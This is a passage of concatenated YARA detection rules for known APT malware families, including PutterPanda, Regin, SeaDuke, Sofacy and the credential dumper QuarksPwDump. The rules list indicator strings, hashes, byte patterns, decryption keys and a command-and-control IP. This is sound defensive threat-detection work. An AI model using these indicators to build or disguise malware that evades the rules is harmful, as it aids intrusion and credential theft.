		$s2 = "InternetQueryOptionA" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 166 times */
		$s3 = "LookupPrivilegeValueA" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 336 times */
		$s4 = "WNetEnumResourceA" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 29 times */
		$s5 = "HttpSendRequestExA" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 87 times */
		$s6 = "PSAPI.DLL" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 420 times */
		$s7 = "Microsoft(R) Windows(R) Operating System" fullword wide /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 128 times */
		$s8 = "CreatePipe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 222 times */
		$s9 = "EnumProcessModules" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 410 times */
	condition:
		all of ($x*) or 
		(1 of ($x*) and all of ($s*) )
}

rule APT_Malware_PutterPanda_Gen1 {
	meta:
		description = "Detects a malware "
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2015-06-03"
		super_rule = 1
		hash0 = "bf1d385e637326a63c4d2f253dc211e6a5436b6a"
		hash1 = "76459bcbe072f9c29bb9703bc72c7cd46a692796"
		hash2 = "e105a7a3a011275002aec4b930c722e6a7ef52ad"
	strings:
		$s1 = "%s%duserid=%dthreadid=%dgroupid=%d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '22.02' */
		$s2 = "ssdpsvc.dll" fullword ascii /* score: '11.00' */
		$s3 = "Fail %s " fullword ascii /* score: '10.04' */
		$s4 = "%s%dpara1=%dpara2=%dpara3=%d" fullword ascii /* score: '10.01' */
		$s5 = "LsaServiceInit" fullword ascii /* score: '7.03' */
		$s6 = "%-8d Fs %-12s Bs " fullword ascii /* score: '5.04' */
		$s7 = "Microsoft DH SChannel Cryptographic Provider" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5.00' */ /* Goodware String - occured 5 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and 5 of them
}

rule Malware_MsUpdater_String_in_EXE {
	meta:
		description = "MSUpdater String in Executable"
		author = "Florian Roth"
		score = 50
		reference = "VT Analysis"
		date = "2015-06-03"
		hash = "b1a2043b7658af4d4c9395fa77fde18ccaf549bb"
	strings:
		$x1 = "msupdate.exe" fullword wide /* PEStudio Blacklist: strings */ /* score: '20.01' */
		// $x2 = "msupdate" fullword wide /* PEStudio Blacklist: strings */ /* score: '13.01' */
		$x3 = "msupdater.exe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '20.02' */
		$x4 = "msupdater32.exe" fullword ascii
		$x5 = "msupdater32.exe" fullword wide
		$x6 = "msupdate.pif" fullword ascii

		$fp1 = "_msupdate_" wide /* False Positive */
		$fp2 = "_msupdate_" ascii /* False Positive */
		$fp3 = "/kies" wide
	condition:
		uint16(0) == 0x5a4d and filesize < 500KB and ( 1 of ($x*) ) and not ( 1 of ($fp*) ) 
}

rule APT_Malware_PutterPanda_MsUpdater_3 {
	meta:
		description = "Detects Malware related to PutterPanda - MSUpdater"
		author = "Florian Roth"
		score = 70
		reference = "VT Analysis"
		date = "2015-06-03"
		hash = "464149ff23f9c7f4ab2f5cadb76a4f41f969bed0"
	strings:
		$s0 = "msupdater.exe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '20.02' */
		$s1 = "Explorer.exe \"" fullword ascii /* PEStudio Blacklist: strings */ /* score: '16.05' */
		$s2 = "FAVORITES.DAT" fullword ascii /* score: '11.02' */
		$s4 = "COMSPEC" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.82' */ /* Goodware String - occured 178 times */
	condition:
		uint16(0) == 0x5a4d and 3 of them
}

rule APT_Malware_PutterPanda_MsUpdater_1 {
	meta:
		description = "Detects Malware related to PutterPanda - MSUpdater"
		author = "Florian Roth"
		score = 70
		reference = "VT Analysis"
		date = "2015-06-03"
		hash = "b55072b67543f58c096571c841a560c53d72f01a"
	strings:
		$x0 = "msupdate.exe" fullword wide /* PEStudio Blacklist: strings */ /* score: '20.01' */
		$x1 = "msupdate" fullword wide /* PEStudio Blacklist: strings */ /* score: '13.01' */

		$s1 = "Microsoft Corporation. All rights reserved." fullword wide /* score: '8.04' */
		$s2 = "Automatic Updates" fullword wide /* PEStudio Blacklist: strings */ /* score: '4.98' */ /* Goodware String - occured 22 times */
		$s3 = "VirtualProtectEx" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.93' */ /* Goodware String - occured 68 times */
		$s4 = "Invalid parameter" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.93' */ /* Goodware String - occured 69 times */
		$s5 = "VirtualAllocEx" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.91' */ /* Goodware String - occured 95 times */
		$s6 = "WriteProcessMemory" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.87' */ /* Goodware String - occured 131 times */
	condition:
		( uint16(0) == 0x5a4d and 1 of ($x*) and 4 of ($s*) ) or
		( 1 of ($x*) and all of ($s*) )
}

rule APT_Malware_PutterPanda_MsUpdater_2 {
	meta:
		description = "Detects Malware related to PutterPanda - MSUpdater"
		author = "Florian Roth"
		score = 70
		reference = "VT Analysis"
		date = "2015-06-03"
		hash = "365b5537e3495f8ecfabe2597399b1f1226879b1"
	strings:
		$s0 = "winsta0\\default" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.99' */ /* Goodware String - occured 6 times */
		$s1 = "EXPLORER.EXE" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.98' */ /* Goodware String - occured 22 times */
		$s2 = "WNetEnumResourceA" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.97' */ /* Goodware String - occured 29 times */
		$s3 = "explorer.exe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.97' */ /* Goodware String - occured 31 times */
		$s4 = "CreateProcessAsUserA" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.91' */ /* Goodware String - occured 86 times */
		$s5 = "HttpSendRequestExA" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.91' */ /* Goodware String - occured 87 times */
		$s6 = "HttpEndRequestA" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.91' */ /* Goodware String - occured 91 times */
		$s7 = "GetModuleBaseNameA" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.88' */ /* Goodware String - occured 121 times */
		$s8 = "GetModuleFileNameExA" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.86' */ /* Goodware String - occured 144 times */
		$s9 = "HttpSendRequestA" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.85' */ /* Goodware String - occured 154 times */
		$s10 = "HttpOpenRequestA" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.84' */ /* Goodware String - occured 159 times */
		$s11 = "InternetConnectA" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.82' */ /* Goodware String - occured 183 times */
		$s12 = "Process32Next" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.80' */ /* Goodware String - occured 204 times */
		$s13 = "Process32First" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.79' */ /* Goodware String - occured 210 times */
		$s14 = "CreatePipe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.78' */ /* Goodware String - occured 222 times */
		$s15 = "EnumProcesses" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.73' */ /* Goodware String - occured 273 times */
		$s16 = "LookupPrivilegeValueA" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.66' */ /* Goodware String - occured 336 times */
		$s17 = "PeekNamedPipe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.65' */ /* Goodware String - occured 347 times */
		$s18 = "EnumProcessModules" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.59' */ /* Goodware String - occured 410 times */
		$s19 = "PSAPI.DLL" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.58' */ /* Goodware String - occured 420 times */
		$s20 = "SPSSSQ" fullword ascii /* score: '4.51' */
	condition:
		uint16(0) == 0x5a4d and filesize < 220KB and all of them
}

rule APT_Malware_PutterPanda_Gen4 {
	meta:
		description = "Detects Malware related to PutterPanda"
		author = "Florian Roth"
		score = 70
		reference = "VT Analysis"
		date = "2015-06-03"
		super_rule = 1
		hash0 = "71a8378fa8e06bcf8ee9f019c807c6bfc58dca0c"
		hash1 = "8fdd6e5ed9d69d560b6fdd5910f80e0914893552"
		hash2 = "3c4a762175326b37035a9192a981f7f4cc2aa5f0"
		hash3 = "598430b3a9b5576f03cc4aed6dc2cd8a43324e1e"
		hash4 = "6522b81b38747f4aa09c98fdaedaed4b00b21689"
	strings:
		$x1 = "rz.dat" fullword ascii /* score: '10.00' */

		$s0 = "Mozilla/4.0 (Compatible; MSIE 6.0;)" fullword ascii /* PEStudio Blacklist: agent */ /* score: '20.03' */
		$s1 = "Internet connect error:%d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '14.04' */
		$s2 = "Proxy-Authorization:Basic " fullword ascii /* PEStudio Blacklist: strings */ /* score: '14.02' */
		$s5 = "Invalid url" fullword ascii /* PEStudio Blacklist: strings */ /* score: '9.03' */
		$s6 = "Create file failed" fullword ascii /* score: '8.04' */
		$s7 = "myAgent" fullword ascii /* score: '8.03' */

		$z1 = "%s%s%d%d" fullword ascii /* score: '8.00' */
		$z2 = "HttpQueryInfo failed:%d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '13.02' */
		$z3 = "read file error:%d" fullword ascii /* score: '11.04' */
		$z4 = "down file success" fullword ascii /* score: '7.04' */
		$z5 = "kPStoreCreateInstance" fullword ascii /* score: '5.03' */
		$z6 = "Avaliable data:%u bytes" fullword ascii /* score: '5.03' */
		$z7 = "abe2869f-9b47-4cd9-a358-c22904dba7f7" fullword ascii /* PEStudio Blacklist: guid */ /* score: '5.00' */ /* Goodware String - occured 2 times */
	condition:
		filesize < 300KB and 
		(
			( uint16(0) == 0x5a4d and $x1 and 3 of ($s*) ) or
			( 3 of ($s*) and 4 of ($z*) )
		)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
rule QuarksPwDump_Gen {
	meta:
		description = "Detects all QuarksPWDump versions"
		author = "Florian Roth"
		date = "2015-09-29"
		score = 80
		hash1 = "2b86e6aea37c324ce686bd2b49cf5b871d90f51cec24476daa01dd69543b54fa"
		hash2 = "87e4c76cd194568e65287f894b4afcef26d498386de181f568879dde124ff48f"
		hash3 = "a59be92bf4cce04335bd1a1fcf08c1a94d5820b80c068b3efe13e2ca83d857c9"
		hash4 = "c5cbb06caa5067fdf916e2f56572435dd40439d8e8554d3354b44f0fd45814ab"
		hash5 = "677c06db064ee8d8777a56a641f773266a4d8e0e48fbf0331da696bea16df6aa"
		hash6 = "d3a1eb1f47588e953b9759a76dfa3f07a3b95fab8d8aa59000fd98251d499674"
		hash7 = "8a81b3a75e783765fe4335a2a6d1e126b12e09380edc4da8319efd9288d88819"
	strings:
		$s1 = "OpenProcessToken() error: 0x%08X" fullword ascii
		$s2 = "%d dumped" fullword ascii
		$s3 = "AdjustTokenPrivileges() error: 0x%08X" fullword ascii
		$s4 = "\\SAM-%u.dmp" fullword ascii
	condition:
		all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.
    Warning: Don't use this rule set without excluding the false positive hashes listed in the file falsepositive-hashes.txt from https://github.com/Neo23x0/Loki/blob/master/signatures/falsepositive-hashes.txt

*/

import "pe"
rule Regin_APT_KernelDriver_Generic_A {
	meta:
		description = "Generic rule for Regin APT kernel driver Malware - Symantec http://t.co/qu53359Cb2"
		author = "@Malwrsignatures - included in APT Scanner THOR"
		date = "23.11.14"
		hash1 = "187044596bc1328efa0ed636d8aa4a5c"
		hash2 = "06665b96e293b23acc80451abb413e50"
		hash3 = "d240f06e98c8d3e647cbf4d442d79475"
	strings:
		$m0 = { 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 b8 } 
		$m1 = { 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 6d 6f 64 65 2e }
		
		$s0 = "atapi.sys" fullword wide
		$s1 = "disk.sys" fullword wide
		$s3 = "h.data" fullword ascii
		$s4 = "\\system32" fullword ascii
		$s5 = "\\SystemRoot" fullword ascii
		$s6 = "system" fullword ascii
		$s7 = "temp" fullword ascii
		$s8 = "windows" fullword ascii

		$x1 = "LRich6" fullword ascii
		$x2 = "KeServiceDescriptorTable" fullword ascii		
	condition:
		$m0 at 0 and $m1 and  	
		all of ($s*) and 1 of ($x*)
}

rule Regin_APT_KernelDriver_Generic_B {
	meta:
		description = "Generic rule for Regin APT kernel driver Malware - Symantec http://t.co/qu53359Cb2"
		author = "@Malwrsignatures - included in APT Scanner THOR"
		date = "23.11.14"
		hash1 = "ffb0b9b5b610191051a7bdf0806e1e47"
		hash2 = "bfbe8c3ee78750c3a520480700e440f8"
		hash3 = "b29ca4f22ae7b7b25f79c1d4a421139d"
		hash4 = "06665b96e293b23acc80451abb413e50"
		hash5 = "2c8b9d2885543d7ade3cae98225e263b"
		hash6 = "4b6b86c7fec1c574706cecedf44abded"
		hash7 = "187044596bc1328efa0ed636d8aa4a5c"
		hash8 = "d240f06e98c8d3e647cbf4d442d79475"
		hash9 = "6662c390b2bbbd291ec7987388fc75d7"
		hash10 = "1c024e599ac055312a4ab75b3950040a"
		hash11 = "ba7bb65634ce1e30c1e5415be3d1db1d"
		hash12 = "b505d65721bb2453d5039a389113b566"
		hash13 = "b269894f434657db2b15949641a67532"
	strings:
		$m0 = { 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 b8 } 
		$s1 = { 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 6d 6f 64 65 2e }
		$s2 = "H.data" fullword ascii nocase
		$s3 = "INIT" fullword ascii
		$s4 = "ntoskrnl.exe" fullword ascii
		
		$v1 = "\\system32" fullword ascii
		$v2 = "\\SystemRoot" fullword ascii
		$v3 = "KeServiceDescriptorTable" fullword ascii	
		
		$w1 = "\\system32" fullword ascii
		$w2 = "\\SystemRoot" fullword ascii		
		$w3 = "LRich6" fullword ascii
		
		$x1 = "_snprintf" fullword ascii
		$x2 = "_except_handler3" fullword ascii
		
		$y1 = "mbstowcs" fullword ascii
		$y2 = "wcstombs" fullword ascii
		$y3 = "KeGetCurrentIrql" fullword ascii
		
		$z1 = "wcscpy" fullword ascii
		$z2 = "ZwCreateFile" fullword ascii
		$z3 = "ZwQueryInformationFile" fullword ascii
		$z4 = "wcslen" fullword ascii
		$z5 = "atoi" fullword ascii
	condition:
		$m0 at 0 and all of ($s*) and 
		( all of ($v*) or all of ($w*) or all of ($x*) or all of ($y*) or all of ($z*) ) 
		and filesize < 20KB
}

rule Regin_APT_KernelDriver_Generic_C {
	meta:
		description = "Generic rule for Regin APT kernel driver Malware - Symantec http://t.co/qu53359Cb2"
		author = "@Malwrsignatures - included in APT Scanner THOR"
		date = "23.11.14"
		hash1 = "e0895336617e0b45b312383814ec6783556d7635"
		hash2 = "732298fa025ed48179a3a2555b45be96f7079712"		
	strings:
		$m0 = { 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 b8 } 
	
		$s0 = "KeGetCurrentIrql" fullword ascii
		$s1 = "5.2.3790.0 (srv03_rtm.030324-2048)" fullword wide
		$s2 = "usbclass" fullword wide
		
		$x1 = "PADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDING" ascii
		$x2 = "Universal Serial Bus Class Driver" fullword wide
		$x3 = "5.2.3790.0" fullword wide
		
		$y1 = "LSA Shell" fullword wide
		$y2 = "0Richw" fullword ascii		
	condition:
		$m0 at 0 and all of ($s*) and 
		( all of ($x*) or all of ($y*) ) 
		and filesize < 20KB
}

/* Update 27.11.14 */

rule Regin_sig_svcsstat {
	meta:
		description = "Detects svcstat from Regin report - file svcsstat.exe_sample"
		author = "@MalwrSignatures"
		date = "26.11.14"
		hash = "5164edc1d54f10b7cb00a266a1b52c623ab005e2"
	strings:
		$s0 = "Service Control Manager" fullword ascii
		$s1 = "_vsnwprintf" fullword ascii
		$s2 = "Root Agency" fullword ascii
		$s3 = "Root Agency0" fullword ascii
		$s4 = "StartServiceCtrlDispatcherA" fullword ascii
		$s5 = "\\\\?\\UNC" fullword wide
		$s6 = "%ls%ls" fullword wide
	condition:
		all of them and filesize < 15KB and filesize > 10KB 
}

rule Regin_Sample_1 {
	meta:
		description = "Auto-generated rule - file-3665415_sys"
		author = "@MalwrSignatures"
		date = "26.11.14"
		hash = "773d7fab06807b5b1bc2d74fa80343e83593caf2"
	strings:
		$s0 = "Getting PortName/Identifier failed - %x" fullword ascii
		$s1 = "SerialAddDevice - error creating new devobj [%#08lx]" fullword ascii
		$s2 = "External Naming Failed - Status %x" fullword ascii
		$s3 = "------- Same multiport - different interrupts" fullword ascii
		$s4 = "%x occurred prior to the wait - starting the" fullword ascii
		$s5 = "'user registry info - userPortIndex: %d" fullword ascii
		$s6 = "Could not report legacy device - %x" fullword ascii
		$s7 = "entering SerialGetPortInfo" fullword ascii
		$s8 = "'user registry info - userPort: %x" fullword ascii
		$s9 = "IoOpenDeviceRegistryKey failed - %x " fullword ascii
		$s10 = "Kernel debugger is using port at address %X" fullword ascii
		$s12 = "Release - freeing multi context" fullword ascii
		$s13 = "Serial driver will not load port" fullword ascii
		$s14 = "'user registry info - userAddressSpace: %d" fullword ascii
		$s15 = "SerialAddDevice: Enumeration request, returning NO_MORE_ENTRIES" fullword ascii
		$s20 = "'user registry info - userIndexed: %d" fullword ascii
	condition:
		all of them and filesize < 110KB and filesize > 80KB
}

rule Regin_Sample_2 {
	meta:
		description = "Auto-generated rule - file hiddenmod_hookdisk_and_kdbg_8949d000.bin"
		author = "@MalwrSignatures"
		date = "26.11.14"
		hash = "a7b285d4b896b66fce0ebfcd15db53b3a74a0400"
	strings:
		$s0 = "\\SYSTEMROOT\\system32\\lsass.exe" fullword wide
		$s1 = "atapi.sys" fullword wide
		$s2 = "disk.sys" fullword wide
		$s3 = "IoGetRelatedDeviceObject" fullword ascii
		$s4 = "HAL.dll" fullword ascii
		$s5 = "\\Registry\\Machine\\System\\CurrentControlSet\\Services" fullword ascii
		$s6 = "PsGetCurrentProcessId" fullword ascii
		$s7 = "KeGetCurrentIrql" fullword ascii
		$s8 = "\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\Session Manager" wide
		$s9 = "KeSetImportanceDpc" fullword ascii
		$s10 = "KeQueryPerformanceCounter" fullword ascii
		$s14 = "KeInitializeEvent" fullword ascii
		$s15 = "KeDelayExecutionThread" fullword ascii
		$s16 = "KeInitializeTimerEx" fullword ascii
		$s18 = "PsLookupProcessByProcessId" fullword ascii
		$s19 = "ExReleaseFastMutexUnsafe" fullword ascii
		$s20 = "ExAcquireFastMutexUnsafe" fullword ascii
	condition:
		all of them and filesize < 40KB and filesize > 30KB
}

rule Regin_Sample_3 {
	meta:
		description = "Detects Regin Backdoor sample fe1419e9dde6d479bd7cda27edd39fafdab2668d498931931a2769b370727129"
		author = "@Malwrsignatures"
		date = "27.11.14"
		hash = "fe1419e9dde6d479bd7cda27edd39fafdab2668d498931931a2769b370727129"		
	strings:
		$hd = { fe ba dc fe }
	
		$s0 = "Service Pack x" fullword wide
		$s1 = "\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" fullword wide
		$s2 = "\\REGISTRY\\Machine\\Software\\Microsoft\\Windows NT\\CurrentVersion\\HotFix" fullword wide
		$s3 = "mntoskrnl.exe" fullword wide
		$s4 = "\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\Session Manager\\Memory Management" fullword wide
		$s5 = "Memory location: 0x%p, size 0x%08x" wide fullword
		$s6 = "Service Pack" fullword wide
		$s7 = ".sys" fullword wide
		$s8 = ".dll" fullword wide		
		
		$s10 = "\\REGISTRY\\Machine\\Software\\Microsoft\\Updates" fullword wide
		$s11 = "IoGetRelatedDeviceObject" fullword ascii
		$s12 = "VMEM.sys" fullword ascii
		$s13 = "RtlGetVersion" fullword wide
		$s14 = "ntkrnlpa.exe" fullword ascii
	condition:
		( $hd at 0 ) and all of ($s*) and filesize > 160KB and filesize < 200KB
}

rule Regin_Sample_Set_1 {
	meta:
		description = "Auto-generated rule - file SHF-000052 and ndisips.sys"
		author = "@MalwrSignatures"
		date = "26.11.14"
		hash1 = "8487a961c8244004c9276979bb4b0c14392fc3b8"
		hash2 = "bcf3461d67b39a427c83f9e39b9833cfec977c61"		
	strings:
		$s0 = "HAL.dll" fullword ascii
		$s1 = "IoGetDeviceObjectPointer" fullword ascii
		$s2 = "MaximumPortsServiced" fullword wide
		$s3 = "KeGetCurrentIrql" fullword ascii
		$s4 = "ntkrnlpa.exe" fullword ascii
		$s5 = "\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\Session Manager" wide
		$s6 = "ConnectMultiplePorts" fullword wide
		$s7 = "\\SYSTEMROOT" fullword wide
		$s8 = "IoWriteErrorLogEntry" fullword ascii
		$s9 = "KeQueryPerformanceCounter" fullword ascii
		$s10 = "KeServiceDescriptorTable" fullword ascii
		$s11 = "KeRemoveEntryDeviceQueue" fullword ascii
		$s12 = "SeSinglePrivilegeCheck" fullword ascii
		$s13 = "KeInitializeEvent" fullword ascii
		$s14 = "IoBuildDeviceIoControlRequest" fullword ascii
		$s15 = "KeRemoveDeviceQueue" fullword ascii
		$s16 = "IofCompleteRequest" fullword ascii
		$s17 = "KeInitializeSpinLock" fullword ascii
		$s18 = "MmIsNonPagedSystemAddressValid" fullword ascii
		$s19 = "IoCreateDevice" fullword ascii
		$s20 = "KefReleaseSpinLockFromDpcLevel" fullword ascii
	condition:
		all of them and filesize < 40KB and filesize > 30KB
}

rule Regin_Sample_Set_2 {
	meta:
		description = "Detects Regin Backdoor sample 4139149552b0322f2c5c993abccc0f0d1b38db4476189a9f9901ac0d57a656be and e420d0cf7a7983f78f5a15e6cb460e93c7603683ae6c41b27bf7f2fa34b2d935"
		author = "@MalwrSignatures"
		date = "27.11.14"
		hash1 = "4139149552b0322f2c5c993abccc0f0d1b38db4476189a9f9901ac0d57a656be"
		hash2 = "e420d0cf7a7983f78f5a15e6cb460e93c7603683ae6c41b27bf7f2fa34b2d935"
	strings:
		$hd = { fe ba dc fe }
	
		$s0 = "d%ls%ls" fullword wide
		$s1 = "\\\\?\\UNC" fullword wide
		$s2 = "Software\\Microsoft\\Windows\\CurrentVersion" fullword wide
		$s3 = "\\\\?\\UNC\\" fullword wide
		$s4 = "SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002BE10318}" fullword wide
		$s5 = "System\\CurrentControlSet\\Services\\Tcpip\\Linkage" wide fullword
		$s6 = "\\\\.\\Global\\%s" fullword wide
		$s7 = "temp" fullword wide
		$s8 = "\\\\.\\%s" fullword wide
		$s9 = "Memory location: 0x%p, size 0x%08x" fullword wide		
		
		$s10 = "sscanf" fullword ascii
		$s11 = "disp.dll" fullword ascii
		$s12 = "%x:%x:%x:%x:%x:%x:%x:%x%c" fullword ascii
		$s13 = "%d.%d.%d.%d%c" fullword ascii
		$s14 = "imagehlp.dll" fullword ascii
		$s15 = "%hd %d" fullword ascii
	condition:
		( $hd at 0 ) and all of ($s*) and filesize < 450KB and filesize > 360KB
}

rule apt_regin_legspin {
	meta:
	    copyright = "Kaspersky Lab"
	    description = "Rule to detect Regin's Legspin module"
	    version = "1.0"
	    last_modified = "2015-01-22"
	    reference = "https://securelist.com/blog/research/68438/an-analysis-of-regins-hopscotch-and-legspin/"
	    md5 = "29105f46e4d33f66fee346cfd099d1cc"
	strings:
	    $mz="MZ"
	    $a1="sharepw"
	    $a2="reglist"
	    $a3="logdump"
	    $a4="Name:" wide
	    $a5="Phys Avail:"
	    $a6="cmd.exe" wide
	    $a7="ping.exe" wide
	    $a8="millisecs"
	condition:
	    ($mz at 0) and all of ($a*)
}

rule apt_regin_hopscotch {
	meta:
	    copyright = "Kaspersky Lab"
	    description = "Rule to detect Regin's Hopscotch module"
	    version = "1.0"
	    last_modified = "2015-01-22"
	    reference = "https://securelist.com/blog/research/68438/an-analysis-of-regins-hopscotch-and-legspin/"
	    md5 = "6c34031d7a5fc2b091b623981a8ae61c"
	strings:

	    $mz="MZ"

	    $a1="AuthenticateNetUseIpc"
	    $a2="Failed to authenticate to"
	    $a3="Failed to disconnect from"
	    $a4="%S\\ipc$" wide
	    $a5="Not deleting..."
	    $a6="CopyServiceToRemoteMachine"
	    $a7="DH Exchange failed"
	    $a8="ConnectToNamedPipes"
	condition:
	    ($mz at 0) and all of ($a*)
}


rule apt_regin_2011_32bit_stage1 {
meta:
copyright = "Kaspersky Lab"
 description = "Rule to detect Regin 32 bit stage 1 loaders"
 version = "1.0"
 last_modified = "2014-11-18"
strings:
$key1={331015EA261D38A7}
$key2={9145A98BA37617DE}
$key3={EF745F23AA67243D}
$mz="MZ"
condition:
($mz at 0) and any of ($key*) and filesize < 300000
}
rule apt_regin_rc5key {
meta:
copyright = "Kaspersky Lab"
 description = "Rule to detect Regin RC5 decryption keys"
 version = "1.0"
 last_modified = "2014-11-18"
strings:
$key1={73 23 1F 43 93 E1 9F 2F 99 0C 17 81 5C FF B4 01}
$key2={10 19 53 2A 11 ED A3 74 3F C3 72 3F 9D 94 3D 78}
condition:
any of ($key*)
}

rule apt_regin_vfs {
meta:
	copyright = "Kaspersky Lab"
	author = "Kaspersky Lab"
	description = "Rule to detect Regin VFSes"
	version = "1.0"
	last_modified = "2014-11-18"
strings:
	$a1={00 02 00 08 00 08 03 F6 D7 F3 52}
	$a2={00 10 F0 FF F0 FF 11 C7 7F E8 52}
	$a3={00 04 00 10 00 10 03 C2 D3 1C 93}
	$a4={00 04 00 10 C8 00 04 C8 93 06 D8}
condition:
	($a1 at 0) or ($a2 at 0) or ($a3 at 0) or ($a4 at 0)
}

rule apt_regin_dispatcher_disp_dll {

meta:
	copyright = "Kaspersky Lab"
	author = "Kaspersky Lab"
	description = "Rule to detect Regin disp.dll dispatcher"
	version = "1.0"
	last_modified = "2014-11-18"

strings:
	$mz="MZ"
	$string1="shit"
	$string2="disp.dll"
	$string3="255.255.255.255"
	$string4="StackWalk64"
	$string5="imagehlp.dll"
condition:
	($mz at 0) and (all of ($string*))
}

rule apt_regin_2013_64bit_stage1 {
meta:
copyright = "Kaspersky Lab"
 description = "Rule to detect Regin 64 bit stage 1 loaders"
 version = "1.0"
 last_modified = "2014-11-18"
 filename="wshnetc.dll"
 md5="bddf5afbea2d0eed77f2ad4e9a4f044d"
 filename="wsharp.dll"
 md5="c053a0a3f1edcbbfc9b51bc640e808ce"
strings:
$mz="MZ"
$a1="PRIVHEAD"
$a2="\\\\.\\PhysicalDrive%d"
$a3="ZwDeviceIoControlFile"
condition:
($mz at 0) and (all of ($a*)) and filesize < 100000
}

/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
rule SeaDuke_Sample {
	meta:
		description = "SeaDuke Malware - file 3eb86b7b067c296ef53e4857a74e09f12c2b84b666fc130d1f58aec18bc74b0d"
		author = "Florian Roth"
		reference = "http://goo.gl/MJ0c2M"
		date = "2015-07-14"
		score = 70
		hash = "d2e570129a12a47231a1ecb8176fa88a1bf415c51dabd885c513d98b15f75d4e"
	strings:
		$s0 = "bpython27.dll" fullword ascii
		$s1 = "email.header(" fullword ascii /* PEStudio Blacklist: strings */
		$s2 = "LogonUI.exe" fullword wide /* PEStudio Blacklist: strings */
		$s3 = "Crypto.Cipher.AES(" fullword ascii /* PEStudio Blacklist: strings */
		$s4 = "mod is NULL - %s" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 4000KB and all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
rule apt_sofacy_xtunnel {
    meta:
        author = "Claudio Guarnieri"
        description = "Sofacy Malware - German Bundestag"
        score = 75
    strings:
        $xaps = ":\\PROJECT\\XAPS_"
        $variant11 = "XAPS_OBJECTIVE.dll" $variant12 = "start"
        $variant21 = "User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0"
        $variant22 = "is you live?"
        $mix1 = "176.31.112.10"
        $mix2 = "error in select, errno %d" $mix3 = "no msg"
        $mix4 = "is you live?"
        $mix5 = "127.0.0.1"
        $mix6 = "err %d"
        $mix7 = "i`m wait"
        $mix8 = "hello"
        $mix9 = "OpenSSL 1.0.1e 11 Feb 2013" $mix10 = "Xtunnel.exe"
    condition:
        ((uint16(0) == 0x5A4D) or (uint16(0) == 0xCFD0)) and (($xaps) or (all of ($variant1*)) or (all of ($variant2*)) or (6 of ($mix*))) 
}

rule Sofacy_Bundestag_Winexe {
    meta:
        description = "Winexe tool used by Sofacy group in Bundestag APT"
        author = "Florian Roth"
        reference = "http://dokumente.linksfraktion.de/inhalt/report-orig.pdf"
